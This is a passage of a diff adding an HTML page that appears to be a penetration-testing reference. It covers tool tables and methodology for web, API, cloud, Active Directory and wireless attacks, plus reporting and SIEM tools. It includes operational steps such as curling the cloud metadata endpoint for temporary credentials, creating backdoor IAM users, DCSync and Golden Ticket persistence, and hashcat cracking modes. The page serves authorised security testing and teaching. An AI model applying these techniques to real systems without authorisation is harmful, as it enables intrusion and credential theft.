+                  <td>XSS</td>
+                  <td>Intelligent XSS scanner — context-aware payload generation, DOM XSS support, CSP bypass testing</td>
+                </tr>
+                <tr>
+                  <td>Dalfox</td>
+                  <td>XSS</td>
+                  <td>Fast parameter XSS scanner — pipe URLs from gau/waymore for large-scope bug bounty testing</td>
+                </tr>
+                <tr>
+                  <td>tplmap</td>
+                  <td>SSTI</td>
+                  <td>Server-Side Template Injection detection — Jinja2, Twig, Smarty, Mako, Freemarker payloads</td>
+                </tr>
+                <tr>
+                  <td>SSRFmap</td>
+                  <td>SSRF</td>
+                  <td>SSRF exploitation — probe internal services, cloud metadata (169.254.169.254), port scan via SSRF</td>
+                </tr>
+                <tr>
+                  <td>Nikto</td>
+                  <td>Web Scanner</td>
+                  <td>Server misconfiguration, outdated software, dangerous HTTP methods, default files</td>
+                </tr>
+                <tr>
+                  <td>nuclei</td>
+                  <td>Template Scanner</td>
+                  <td>Community-maintained vuln templates — CVEs, misconfigs, exposed panels, exposed secrets</td>
+                </tr>
+                <tr>
+                  <td>jwt_tool</td>
+                  <td>JWT Testing</td>
+                  <td>Decode, tamper, fuzz JWT tokens — test alg:none, RS256→HS256, key confusion, injection attacks</td>
+                </tr>
+                <tr>
+                  <td>wfuzz</td>
+                  <td>Fuzzing</td>
+                  <td>Web application fuzzer — cookie fuzzing, header injection, multi-point fuzzing with FUZZ markers</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- Tools: API Testing -->
+        <div class="tm-subsection" id="web-api">
+          <div class="tm-subsection-title">API Testing</div>
+          <div class="tm-table-wrap">
+            <table class="tm-table">
+              <thead>
+                <tr>
+                  <th>Tool</th>
+                  <th>Category</th>
+                  <th>Use Case</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>Postman</td>
+                  <td>API Client</td>
+                  <td>Build and send API requests manually; import OpenAPI/Swagger specs; test auth flows and responses</td>
+                </tr>
+                <tr>
+                  <td>Burp Suite</td>
+                  <td>API Interception</td>
+                  <td>Intercept REST/GraphQL traffic; fuzz JSON bodies; test BOLA/BFLA via modified object IDs</td>
+                </tr>
+                <tr>
+                  <td>Insomnia</td>
+                  <td>API Client</td>
+                  <td>REST + GraphQL + gRPC client — useful for testing APIs without Burp when needed</td>
+                </tr>
+                <tr>
+                  <td>kiterunner</td>
+                  <td>API Discovery</td>
+                  <td>Brute-force API routes using real API wordlists — far better coverage than generic dirbusting</td>
+                </tr>
+                <tr>
+                  <td>GraphQL Voyager</td>
+                  <td>GraphQL</td>
+                  <td>Visualise GraphQL schema from introspection — map types, queries, mutations to find hidden data</td>
+                </tr>
+                <tr>
+                  <td>graphw00f</td>
+                  <td>GraphQL Fingerprint</td>
+                  <td>Detect which GraphQL engine (Apollo, Hasura, etc.) is running for targeted payloads</td>
+                </tr>
+                <tr>
+                  <td>swagger-ui (target)</td>
+                  <td>API Docs</td>
+                  <td>Check if /api-docs, /swagger, /openapi.json exposed — reveals full API schema unauthenticated</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+      </section>
+
+      <!-- ════════════════════════════════
+           SECTION 2: CLOUD PENTEST
+      ════════════════════════════════ -->
+      <section class="tm-section" id="cloud">
+        <div class="tm-section-header">
+          <span class="tm-section-icon">☁️</span>
+          <h2 class="tm-section-title">Cloud Penetration Testing</h2>
+          <span class="tm-section-badge">AWS · Azure · GCP</span>
+        </div>
+
+        <div class="tm-tip">
+          <strong>Always confirm scope for cloud.</strong> Cloud pentests require explicit written authorisation
+          from the cloud provider in addition to the client's permission. AWS, Azure, and GCP each have their own
+          penetration testing policy — read them before testing.
+        </div>
+
+        <!-- Methodology -->
+        <div class="tm-subsection" id="cloud-methodology">
+          <div class="tm-subsection-title">Methodology</div>
+
+          <details class="tm-accordion" open>
+            <summary class="tm-accordion-head">
+              <span class="tm-step-num">01</span>
+              <span class="tm-accordion-label">Enumeration &amp; Initial Recon</span>
+              <span class="tm-accordion-sub">Identity, permissions, and resource discovery</span>
+              <span class="tm-accordion-chevron">▾</span>
+            </summary>
+            <div class="tm-accordion-body">
+              <ul>
+                <li>Confirm which cloud provider(s) and services are in scope</li>
+                <li>Enumerate IAM principals: users, roles, groups, service accounts</li>
+                <li>Check for exposed credentials: .env files, S3 bucket listings, public repos, metadata endpoints</li>
+                <li><strong>AWS:</strong> <code>aws sts get-caller-identity</code> to confirm your identity; <code>aws iam list-users</code>, <code>list-roles</code></li>
+                <li><strong>Azure:</strong> <code>az account show</code>, <code>az ad user list</code>, <code>az role assignment list</code></li>
+                <li><strong>GCP:</strong> <code>gcloud auth list</code>, <code>gcloud projects list</code>, <code>gcloud iam service-accounts list</code></li>
+                <li>Discover storage: S3 buckets, Azure blobs, GCS buckets — check for public read/write access</li>
+              </ul>
+            </div>
+          </details>
+
+          <details class="tm-accordion">
+            <summary class="tm-accordion-head">
+              <span class="tm-step-num">02</span>
+              <span class="tm-accordion-label">Privilege Escalation &amp; Lateral Movement</span>
+              <span class="tm-accordion-sub">Escalate from low-priv credentials to admin / root</span>
+              <span class="tm-accordion-chevron">▾</span>
+            </summary>
+            <div class="tm-accordion-body">
+              <ul>
+                <li>Map attached policies — identify wildcards, overly permissive actions (<code>*</code> on <code>iam:*</code>, <code>s3:*</code>)</li>
+                <li><strong>AWS PrivEsc:</strong> iam:PassRole, iam:CreatePolicy, sts:AssumeRole chains; Lambda/EC2 role abuse</li>
+                <li><strong>IMDS abuse:</strong> From inside an EC2/VM, curl <code>169.254.169.254/latest/meta-data/iam/security-credentials/</code> for temp keys</li>
+                <li>Check for cross-account trust relationships and assume-role chains</li>
+                <li>Identify misconfigured security groups: 0.0.0.0/0 on ports 22, 3389, 6379, 9200</li>
+                <li>Test for exposed secrets in environment variables, user-data scripts, and SSM Parameter Store</li>
+              </ul>
+            </div>
+          </details>
+
+          <details class="tm-accordion">
+            <summary class="tm-accordion-head">
+              <span class="tm-step-num">03</span>
+              <span class="tm-accordion-label">Data Exposure &amp; Persistence</span>
+              <span class="tm-accordion-sub">Identify data at risk and persistence mechanisms</span>
+              <span class="tm-accordion-chevron">▾</span>
+            </summary>
+            <div class="tm-accordion-body">
+              <ul>
+                <li>Audit public storage buckets for sensitive data (keys, PII, backups, DB dumps)</li>
+                <li>Check snapshot visibility: publicly shared EBS snapshots, RDS snapshots, AMIs</li>
+                <li>Look for unencrypted S3 buckets, RDS instances without encryption at rest</li>
+                <li>Persistence: backdoor IAM user, add access key to existing user, create Lambda persistence</li>
+                <li>Review CloudTrail / Azure Monitor / GCP Audit Logs for gaps or disabled logging</li>
+                <li>Check for exposed Kubernetes API server (EKS, AKS, GKE) — <code>kubectl auth can-i --list</code></li>
+              </ul>
+            </div>
+          </details>
+        </div>
+
+        <!-- AWS Tools -->
+        <div class="tm-subsection" id="cloud-aws">
+          <div class="tm-subsection-title">AWS Tools</div>
+          <div class="tm-table-wrap">
+            <table class="tm-table">
+              <thead><tr><th>Tool</th><th>Category</th><th>Use Case</th></tr></thead>
+              <tbody>
+                <tr>
+                  <td>aws-cli</td>
+                  <td>Official CLI</td>
+                  <td>Enumerate and interact with all AWS services; configure multiple profiles for different key sets</td>
+                </tr>
+                <tr>
+                  <td>Pacu</td>
+                  <td>AWS Exploitation Framework</td>
+                  <td>Modular AWS pentest framework — IAM enum, privesc, data exfil, persistence modules</td>
+                </tr>
+                <tr>
+                  <td>ScoutSuite</td>
+                  <td>Multi-cloud Auditing</td>
+                  <td>Security audit of AWS/Azure/GCP — generates HTML report of misconfigurations and risks</td>
+                </tr>
+                <tr>
+                  <td>Prowler</td>
+                  <td>AWS Security Checks</td>
+                  <td>CIS benchmark checks for AWS — IAM, S3, CloudTrail, VPC, EC2, RDS hardening review</td>
+                </tr>
+                <tr>
+                  <td>CloudFox</td>
+                  <td>Cloud Situational Awareness</td>
+                  <td>Automates AWS discovery — finds interesting permissions, secrets, attack paths from given keys</td>
+                </tr>
+                <tr>
+                  <td>enumerate-iam</td>
+                  <td>IAM Enumeration</td>
+                  <td>Brute-force IAM permissions for a set of credentials — find what actions are allowed</td>
+                </tr>
+                <tr>
+                  <td>S3Scanner</td>
+                  <td>S3 Bucket Discovery</td>
+                  <td>Find and scan S3 buckets for public read/write access given a list of bucket names or wordlist</td>
+                </tr>
+                <tr>
+                  <td>WeirdAAL</td>
+                  <td>AWS Attack Library</td>
+                  <td>Collection of AWS attack techniques — recon, persistence, lateral movement, exfiltration modules</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- Azure / GCP Tools -->
+        <div class="tm-subsection" id="cloud-azure-gcp">
+          <div class="tm-subsection-title">Azure &amp; GCP Tools</div>
+          <div class="tm-table-wrap">
+            <table class="tm-table">
+              <thead><tr><th>Tool</th><th>Platform</th><th>Use Case</th></tr></thead>
+              <tbody>
+                <tr>
+                  <td>ROADrecon</td>
+                  <td>Azure AD</td>
+                  <td>Enumerate Azure AD (Entra ID) — users, groups, apps, roles, conditional access policies</td>
+                </tr>
+                <tr>
+                  <td>BloodHound (Azure)</td>
+                  <td>Azure AD</td>
+                  <td>AzureHound collector maps Azure AD attack paths — Entra ID privesc and lateral movement</td>
+                </tr>
+                <tr>
+                  <td>AADInternals</td>
+                  <td>Azure AD</td>
+                  <td>PowerShell toolkit for Azure AD recon and attack — token abuse, admin takeover, Teams phishing</td>
+                </tr>
+                <tr>
+                  <td>MicroBurst</td>
+                  <td>Azure</td>
+                  <td>Azure security assessment scripts — storage recon, runbook backdoors, key vault access</td>
+                </tr>
+                <tr>
+                  <td>gcloud CLI</td>
+                  <td>GCP</td>
+                  <td>Official GCP CLI — enumerate projects, IAM, compute, storage, service accounts</td>
+                </tr>
+                <tr>
+                  <td>GCPBucketBrute</td>
+                  <td>GCP</td>
+                  <td>Enumerate GCS buckets for target org — check for public access and interesting data</td>
+                </tr>
+                <tr>
+                  <td>ScoutSuite</td>
+                  <td>Multi-cloud</td>
+                  <td>Works across AWS, Azure, GCP, Alibaba — unified misconfiguration report</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+      </section>
+
+      <!-- ════════════════════════════════
+           SECTION 3: ACTIVE DIRECTORY
+      ════════════════════════════════ -->
+      <section class="tm-section" id="active-directory">
+        <div class="tm-section-header">
+          <span class="tm-section-icon">🏢</span>
+          <h2 class="tm-section-title">Active Directory Pentest</h2>
+          <span class="tm-section-badge">Internal / On-Prem</span>
+        </div>
+
+        <!-- Methodology -->
+        <div class="tm-subsection" id="ad-methodology">
+          <div class="tm-subsection-title">Methodology</div>
+
+          <details class="tm-accordion" open>
+            <summary class="tm-accordion-head">
+              <span class="tm-step-num">01</span>
+              <span class="tm-accordion-label">Initial Foothold</span>
+              <span class="tm-accordion-sub">Gain first credentials or domain access</span>
+              <span class="tm-accordion-chevron">▾</span>
+            </summary>
+            <div class="tm-accordion-body">
+              <ul>
+                <li>LLMNR/NBT-NS poisoning with Responder to capture NTLMv2 hashes</li>
+                <li>Password spray against SMB / OWA / VPN portals — low &amp; slow to avoid lockout</li>
+                <li>Anonymous/null SMB session enumeration: shares, users, policies without credentials</li>
+                <li>AS-REP Roasting: target accounts with pre-auth disabled — no creds required</li>
+                <li>Phishing / initial access simulation (if in scope): deliver payload, capture beacon</li>
+                <li>Check for default credentials on network services: printers, IPMI, web panels</li>
+              </ul>
+            </div>
+          </details>
+
+          <details class="tm-accordion">
+            <summary class="tm-accordion-head">
+              <span class="tm-step-num">02</span>
+              <span class="tm-accordion-label">Domain Enumeration</span>
+              <span class="tm-accordion-sub">Map the domain from low-priv user context</span>
+              <span class="tm-accordion-chevron">▾</span>
+            </summary>
+            <div class="tm-accordion-body">
+              <ul>
+                <li>BloodHound + SharpHound: collect all domain objects, build attack path graph</li>
+                <li>PowerView: enumerate users, groups, computers, GPOs, OUs, ACLs, trusts</li>
+                <li>Identify privileged groups: Domain Admins, Enterprise Admins, Account Operators, Backup Operators</li>
+                <li>Find Kerberoastable accounts: SPNs set on user accounts with weak passwords</li>
+                <li>Map Group Policy: find policies deploying scripts, mapped drives, push credentials</li>
+                <li>Identify unconstrained, constrained, and resource-based constrained delegation</li>
+                <li>Check for LAPS deployment gaps — computers without LAPS still use shared local admin passwords</li>
+              </ul>
+            </div>
+          </details>
+
+          <details class="tm-accordion">
+            <summary class="tm-accordion-head">
+              <span class="tm-step-num">03</span>
+              <span class="tm-accordion-label">Lateral Movement</span>
+              <span class="tm-accordion-sub">Move from low-priv host to high-value targets</span>
+              <span class="tm-accordion-chevron">▾</span>
+            </summary>
+            <div class="tm-accordion-body">
+              <ul>
+                <li>Pass-the-Hash: use NTLM hash without cracking — access SMB, WMI, PSExec, WinRM</li>
+                <li>Pass-the-Ticket: inject Kerberos TGT/TGS to access services as another user</li>
+                <li>Overpass-the-Hash: convert NTLM hash → Kerberos TGT for more stealthy access</li>
+                <li>WMI / PSExec / WinRM lateral movement from admin credentials</li>
+                <li>DCOM lateral movement: stealthier than PSExec, bypasses many EDR detections</li>
+                <li>Harvest credentials from memory (Mimikatz), registry (SAM), DPAPI blobs, cached hashes</li>
+                <li>Token impersonation: steal tokens of higher-priv processes on a compromised host</li>
+              </ul>
+            </div>
+          </details>
+
+          <details class="tm-accordion">
+            <summary class="tm-accordion-head">
+              <span class="tm-step-num">04</span>
+              <span class="tm-accordion-label">Privilege Escalation to Domain Admin</span>
+              <span class="tm-accordion-sub">Escalate to full domain compromise</span>
+              <span class="tm-accordion-chevron">▾</span>
+            </summary>
+            <div class="tm-accordion-body">
+              <ul>
+                <li>Kerberoasting: crack TGS tickets for SPN accounts offline with hashcat</li>
+                <li>AS-REP Roasting: crack hashes for accounts with pre-auth disabled</li>
+                <li>DCSync: if you have DS-Replication rights, dump all hashes remotely via impacket secretsdump</li>
+                <li>Unconstrained Delegation: capture TGT from any connecting admin, use for DA impersonation</li>
+                <li>ACL abuse: WriteDACL, GenericAll, ForceChangePassword — escalate via ACE misconfigurations</li>
+                <li>Golden Ticket: forge TGTs with compromised KRBTGT hash — 10-year persistence</li>
+                <li>Silver Ticket: forge TGS for specific service using computer account or service hash</li>
+                <li>PrinterBug / PetitPotam: force DC authentication, capture + relay to achieve DA</li>
+              </ul>
+            </div>
+          </details>
+        </div>
+
+        <!-- AD Tools: Enumeration -->
+        <div class="tm-subsection" id="ad-enum">
+          <div class="tm-subsection-title">Enumeration Tools</div>
+          <div class="tm-table-wrap">
+            <table class="tm-table">
+              <thead><tr><th>Tool</th><th>Category</th><th>Use Case</th></tr></thead>
+              <tbody>
+                <tr>
+                  <td>BloodHound</td>
+                  <td>Attack Path Mapping</td>
+                  <td>Graph-based AD attack path analysis — visualises shortest path to DA, Kerberoastable accounts, ACL abuse</td>
+                </tr>
+                <tr>
+                  <td>SharpHound</td>
+                  <td>Data Collector</td>
+                  <td>C# collector for BloodHound — runs in memory, collects sessions, ACLs, group membership, GPOs</td>
+                </tr>
+                <tr>
+                  <td>PowerView</td>
+                  <td>AD Enumeration (PS)</td>
+                  <td>PowerShell AD recon — Get-DomainUser, Get-DomainGroupMember, Find-LocalAdminAccess, Get-DomainACL</td>
+                </tr>
+                <tr>
+                  <td>ldapdomaindump</td>
+                  <td>LDAP Dump</td>
+                  <td>Dump AD info via LDAP — users, computers, groups, GPOs exported to HTML/JSON/grepable formats</td>
+                </tr>
+                <tr>
+                  <td>enum4linux-ng</td>
+                  <td>SMB Enumeration</td>
+                  <td>Enumerate Windows/Samba hosts: users, shares, password policy, groups — null session + authenticated</td>
+                </tr>
+                <tr>
+                  <td>rpcclient</td>
+                  <td>RPC Enumeration</td>
+                  <td>Interact with Windows RPC endpoints — enumdomusers, querydispinfo, enumprinters, lookupsids</td>
+                </tr>
+                <tr>
+                  <td>ADFind</td>
+                  <td>LDAP Query</td>
+                  <td>Powerful LDAP query tool for AD — find specific objects, trusts, SPNs without PowerShell</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- AD Tools: Credential Attacks -->
+        <div class="tm-subsection" id="ad-creds">
+          <div class="tm-subsection-title">Credential Attacks &amp; Lateral Movement</div>
+          <div class="tm-table-wrap">
+            <table class="tm-table">
+              <thead><tr><th>Tool</th><th>Category</th><th>Use Case</th></tr></thead>
+              <tbody>
+                <tr>
+                  <td>Mimikatz</td>
+                  <td>Credential Dumping</td>
+                  <td>Dump plaintext passwords, NTLM hashes, Kerberos tickets from lsass; Pass-the-Hash, Golden/Silver Ticket</td>
+                </tr>
+                <tr>
+                  <td>Impacket</td>
+                  <td>Protocol Suite</td>
+                  <td>Python suite: secretsdump, psexec, wmiexec, smbclient, GetUserSPNs, GetNPUsers, DCSync, relay attacks</td>
+                </tr>
+                <tr>
+                  <td>CrackMapExec</td>
+                  <td>Network Lateral Move</td>
+                  <td>Mass SMB/WinRM/MSSQL authentication testing, command execution, module library for post-exploitation</td>
+                </tr>
+                <tr>
+                  <td>Responder</td>
+                  <td>LLMNR/NBT-NS Poison</td>
+                  <td>Capture NTLMv2 hashes via LLMNR/mDNS/NBT-NS poisoning on the local network</td>
+                </tr>
+                <tr>
+                  <td>Rubeus</td>
+                  <td>Kerberos Attacks</td>
+                  <td>Kerberoasting, AS-REP Roasting, Pass-the-Ticket, S4U abuse, unconstrained delegation harvest</td>
+                </tr>
+                <tr>
+                  <td>hashcat</td>
+                  <td>Offline Hash Cracking</td>
+                  <td>GPU-accelerated cracking: NTLMv2 (-m 5600), Kerberos TGS (-m 13100), NTLM (-m 1000)</td>
+                </tr>
+                <tr>
+                  <td>Evil-WinRM</td>
+                  <td>Remote Access</td>
+                  <td>WinRM shell with pass-the-hash, upload/download, script loading, AMSI bypass built in</td>
+                </tr>
+                <tr>
+                  <td>ntlmrelayx</td>
+                  <td>NTLM Relay</td>
+                  <td>Relay captured NTLM auth to SMB, LDAP, HTTP targets — part of Impacket; enables DA via relay chain</td>
+                </tr>
+                <tr>
+                  <td>Kerbrute</td>
+                  <td>Kerberos Spray</td>
+                  <td>Username enumeration and password spraying via Kerberos pre-authentication — faster than SMB spray</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+      </section>
+
+      <!-- ════════════════════════════════
+           SECTION 4: NETWORK ATTACKS
+      ════════════════════════════════ -->
+      <section class="tm-section" id="network">
+        <div class="tm-section-header">
+          <span class="tm-section-icon">📡</span>
+          <h2 class="tm-section-title">Network Attacks</h2>
+          <span class="tm-section-badge">Wired · Wireless</span>
+        </div>
+
+        <!-- Wired Tools -->
+        <div class="tm-subsection" id="network-wired">
+          <div class="tm-subsection-title">Network Scanning &amp; Wired Attacks</div>
+          <div class="tm-table-wrap">
+            <table class="tm-table">
+              <thead><tr><th>Tool</th><th>Category</th><th>Use Case</th></tr></thead>
+              <tbody>
+                <tr>
+                  <td>Nmap</td>
+                  <td>Port Scanner</td>
+                  <td>Host discovery, port scanning (SYN, UDP, version), NSE scripts for vuln detection and service enum</td>
+                </tr>
+                <tr>
+                  <td>Masscan</td>
+                  <td>Fast Port Scanner</td>
+                  <td>Scan entire /8 subnets in minutes — use for rapid discovery, then pipe to Nmap for deep scanning</td>
+                </tr>
+                <tr>
+                  <td>Metasploit Framework</td>
+                  <td>Exploitation</td>
+                  <td>Exploit modules, auxiliary scanners, payload generation, post-exploitation modules, meterpreter</td>
+                </tr>
+                <tr>
+                  <td>Wireshark / tcpdump</td>
+                  <td>Traffic Analysis</td>
+                  <td>Capture and analyse network traffic — identify cleartext credentials, protocols, anomalous traffic</td>
+                </tr>
+                <tr>
+                  <td>Netcat (nc)</td>
+                  <td>Network Utility</td>
+                  <td>Bind/reverse shells, port scanning, banner grabbing, file transfer, port forwarding</td>
+                </tr>
+                <tr>
+                  <td>socat</td>
+                  <td>Advanced Netcat</td>
+                  <td>Bidirectional relay — fully interactive TTY shells, SSL tunnels, port forwarding with TLS</td>
+                </tr>
+                <tr>
+                  <td>chisel</td>
+                  <td>Tunnelling</td>
+                  <td>TCP/UDP tunnel over HTTP with SSH transport — punch through firewalls, create reverse SOCKS proxy</td>
+                </tr>
+                <tr>
+                  <td>ligolo-ng</td>
+                  <td>Tunnelling</td>
+                  <td>Reverse tunnelling agent — create a TUN interface on attack box routing through pivot; cleaner than chisel</td>
+                </tr>
+                <tr>
+                  <td>proxychains</td>
+                  <td>Proxy Chain</td>
+                  <td>Route any tool through a SOCKS proxy — use with chisel/ligolo for full internal network access</td>
+                </tr>
+                <tr>
+                  <td>Snaffler</td>
+                  <td>Share/File Hunting</td>
+                  <td>Enumerate SMB shares for interesting files: passwords, configs, keys — runs from domain-joined context</td>
+                </tr>
+                <tr>
+                  <td>Nessus / OpenVAS</td>
+                  <td>Vulnerability Scanner</td>
+                  <td>Network-wide authenticated/unauthenticated vuln scanning — CVEs, misconfigs, patch gaps</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- Wireless Tools -->
+        <div class="tm-subsection" id="network-wireless">
+          <div class="tm-subsection-title">Wireless Attacks</div>
+
+          <div class="tm-tip">
+            <strong>Legal reminder:</strong> Wireless testing requires explicit written authorisation for every SSID and
+            frequency band being tested. Capturing traffic from networks not in scope is illegal in most jurisdictions.
+          </div>
+
+          <div class="tm-table-wrap">
+            <table class="tm-table">
+              <thead><tr><th>Tool</th><th>Category</th><th>Use Case</th></tr></thead>
+              <tbody>
+                <tr>
+                  <td>aircrack-ng suite</td>
+                  <td>Wireless Framework</td>
+                  <td>Capture WPA handshakes (airodump-ng), deauth clients (aireplay-ng), crack PSK (aircrack-ng + wordlist)</td>
+                </tr>
+                <tr>
+                  <td>hcxdumptool</td>
+                  <td>Handshake Capture</td>
+                  <td>Capture PMKID and EAPOL handshakes from nearby networks without deauth — stealthier than airodump</td>
+                </tr>
+                <tr>
+                  <td>hcxtools</td>
+                  <td>Hash Conversion</td>
+                  <td>Convert captured .pcapng files to hashcat format for offline WPA2 PSK cracking</td>
+                </tr>
+                <tr>
+                  <td>hashcat (WiFi)</td>
+                  <td>WPA Cracking</td>
+                  <td>Crack WPA2 PSK hashes: -m 22000 (PMKID+EAPOL), -m 2500 (legacy EAPOL) with GPU acceleration</td>
+                </tr>
+                <tr>
+                  <td>Bettercap</td>
+                  <td>MitM Framework</td>
+                  <td>ARP spoofing, DNS spoofing, SSL stripping, WiFi recon, HTTPS MITM with modular architecture</td>
+                </tr>
+                <tr>
+                  <td>hostapd-wpe</td>
+                  <td>Evil Twin / EAP</td>
+                  <td>Rogue AP with WPE patch — capture PEAP/TTLS credentials from enterprise WPA2-Enterprise targets</td>
+                </tr>
+                <tr>
+                  <td>Wifiphisher</td>
+                  <td>Rogue AP</td>
+                  <td>Automated rogue AP attacks — captive portal credential harvest, firmware upgrade phishing</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+      </section>
+
+      <!-- ════════════════════════════════
+           SECTION 5: REPORTING
+      ════════════════════════════════ -->
+      <section class="tm-section" id="reporting">
+        <div class="tm-section-header">
+          <span class="tm-section-icon">📋</span>
+          <h2 class="tm-section-title">Reporting</h2>
+          <span class="tm-section-badge">Structure · Severity · Remediation</span>
+        </div>
+
+        <!-- Report Structure -->
+        <div class="tm-subsection" id="reporting-structure">
+          <div class="tm-subsection-title">Report Structure</div>
+          <div class="tm-numbered-list">
+            <div class="tm-numbered-item">
+              <span class="tm-numbered-item-n">01</span>
+              <div class="tm-numbered-item-text"><strong>Executive Summary</strong> — 1–2 page non-technical overview: overall risk posture, most critical findings, business impact. Written for the CISO and board, not the technical team.</div>
+            </div>
+            <div class="tm-numbered-item">
+              <span class="tm-numbered-item-n">02</span>
+              <div class="tm-numbered-item-text"><strong>Scope &amp; Methodology</strong> — Targets in scope, testing period, methodology used (black/grey/white box), tools, limitations, and any testing constraints.</div>
+            </div>
+            <div class="tm-numbered-item">
+              <span class="tm-numbered-item-n">03</span>
+              <div class="tm-numbered-item-text"><strong>Risk Rating Summary</strong> — Table of all findings by severity (Critical / High / Medium / Low / Informational) with counts and overall risk rating.</div>
+            </div>
+            <div class="tm-numbered-item">
+              <span class="tm-numbered-item-n">04</span>
+              <div class="tm-numbered-item-text"><strong>Technical Findings</strong> — One section per vulnerability: title, severity, CVSS score, description, proof of concept steps, evidence (screenshots), affected asset, and specific remediation recommendation.</div>
+            </div>
+            <div class="tm-numbered-item">
+              <span class="tm-numbered-item-n">05</span>
+              <div class="tm-numbered-item-text"><strong>Remediation Roadmap</strong> — Prioritised fix list: Critical and High findings first, grouped by team/system responsible. Include short-term mitigations and long-term fixes separately.</div>
+            </div>
+            <div class="tm-numbered-item">
+              <span class="tm-numbered-item-n">06</span>
+              <div class="tm-numbered-item-text"><strong>Appendix</strong> — Full tool output, raw scan results, network diagrams, credential evidence (hashed), and any additional technical detail too long for main findings.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Finding Template -->
+        <div class="tm-subsection" id="reporting-finding">
+          <div class="tm-subsection-title">Finding Template</div>
+          <div class="tm-tip">
+            <strong>Every finding needs these fields:</strong> Title · Severity (Critical/High/Medium/Low/Info) ·
+            CVSS Score · CWE/CVE reference · Affected asset · Description · Root cause · PoC steps ·
+            Evidence · Impact · Recommendation · References.
+          </div>
+          <div class="tm-table-wrap">
+            <table class="tm-table">
+              <thead><tr><th>Severity</th><th>CVSS Range</th><th>Typical Examples</th><th>SLA (fix by)</th></tr></thead>
+              <tbody>
+                <tr>
+                  <td>Critical</td>
+                  <td>9.0 – 10.0</td>
+                  <td>RCE, SQLi with DB dump, Domain Admin compromise, unauthenticated data exfil</td>
+                  <td>24 – 72 hours</td>
+                </tr>
+                <tr>
+                  <td>High</td>
+                  <td>7.0 – 8.9</td>
+                  <td>Privilege escalation, SSRF to internal network, stored XSS on admin panel, credential exposure</td>
+                  <td>1 – 2 weeks</td>
+                </tr>
+                <tr>
+                  <td>Medium</td>
+                  <td>4.0 – 6.9</td>
+                  <td>Reflected XSS, IDOR (non-sensitive data), missing CSRF protection, insecure direct object reference</td>
+                  <td>1 month</td>
+                </tr>
+                <tr>
+                  <td>Low</td>
+                  <td>0.1 – 3.9</td>
+                  <td>Missing security headers, verbose error messages, weak TLS cipher suites, open redirect</td>
+                  <td>Next release</td>
+                </tr>
+                <tr>
+                  <td>Informational</td>
+                  <td>N/A</td>
+                  <td>Best-practice gaps, outdated libraries (no exploitable CVE), minor misconfigurations</td>
+                  <td>Backlog</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- Reporting Tools -->
+        <div class="tm-subsection" id="reporting-tools">
+          <div class="tm-subsection-title">Reporting Tools</div>
+          <div class="tm-table-wrap">
+            <table class="tm-table">
+              <thead><tr><th>Tool</th><th>Category</th><th>Use Case</th></tr></thead>
+              <tbody>
+                <tr>
+                  <td>Pwndoc</td>
+                  <td>Report Generator</td>
+                  <td>Self-hosted pentest report generator — collaborative, vulnerability database, custom templates, PDF export</td>
+                </tr>
+                <tr>
+                  <td>PlexTrac</td>
+                  <td>Report Platform</td>
+                  <td>Commercial pentest management — findings DB, client portal, narrative builder, retest tracking</td>
+                </tr>
+                <tr>
+                  <td>Dradis CE</td>
+                  <td>Collaboration Platform</td>
+                  <td>Import Nmap, Burp, Nessus output; collaborative findings editor; export to Word/HTML</td>
+                </tr>
+                <tr>
+                  <td>Flaws / CherryTree</td>
+                  <td>Note Taking</td>
+                  <td>Hierarchical notes during engagements — organise by host, service, finding for clean report compilation</td>
+                </tr>
+                <tr>
+                  <td>Obsidian</td>
+                  <td>Knowledge Base</td>
+                  <td>Markdown-based notes with linking — build personal methodology/knowledge base, engagement journals</td>
+                </tr>
+                <tr>
+                  <td>LibreOffice Calc</td>
+                  <td>Finding Tracker</td>
+                  <td>Spreadsheet tracking all findings across scope — status, severity, assigned fix, retest result</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+      </section>
+
+      <!-- ════════════════════════════════
+           SECTION 6: BLUE TEAM / SOC
+      ════════════════════════════════ -->
+      <section class="tm-section" id="blue-team">
+        <div class="tm-section-header">
+          <span class="tm-section-icon">🛡️</span>
+          <h2 class="tm-section-title">Blue Team / SOC</h2>
+          <span class="tm-section-badge">SIEM · IR · Threat Hunting</span>
+        </div>
+
+        <!-- SIEM Tools -->
+        <div class="tm-subsection" id="soc-siem">
+          <div class="tm-subsection-title">SIEM &amp; Log Analysis</div>
+          <div class="tm-table-wrap">
+            <table class="tm-table">
+              <thead><tr><th>Tool</th><th>Category</th><th>Use Case</th></tr></thead>
+              <tbody>
+                <tr>
+                  <td>Splunk</td>
+                  <td>SIEM</td>
+                  <td>Search, correlate, and alert on log data — SPL queries for threat hunting, dashboards, scheduled alerts</td>
+                </tr>
+                <tr>
+                  <td>Wazuh</td>
+                  <td>Open-source XDR / SIEM</td>
+                  <td>Agent-based host monitoring: FIM, vulnerability detection, MITRE ATT&CK mapping, active response</td>
+                </tr>
+                <tr>
+                  <td>Elastic SIEM</td>
+                  <td>SIEM</td>
+                  <td>ELK stack with Security solution — detection rules, timeline, ML-based anomaly detection</td>
+                </tr>
+                <tr>
+                  <td>Graylog</td>
+                  <td>Log Management</td>
+                  <td>Centralised log aggregation from syslog, Beats, GELF — alerting and stream-based filtering</td>
+                </tr>
+                <tr>
+                  <td>Sigma</td>
+                  <td>Detection Rules</td>
+                  <td>Generic SIEM detection rule format — convert community rules to Splunk/Elastic/QRadar SPL/KQL</td>
+                </tr>
+                <tr>
+                  <td>Zeek (Bro)</td>
+                  <td>Network Analysis</td>
+                  <td>Network traffic analysis framework — generates structured logs (conn, dns, http, ssl, files) for SIEM ingestion</td>
+                </tr>
+                <tr>
+                  <td>Suricata</td>
+                  <td>IDS / IPS</td>
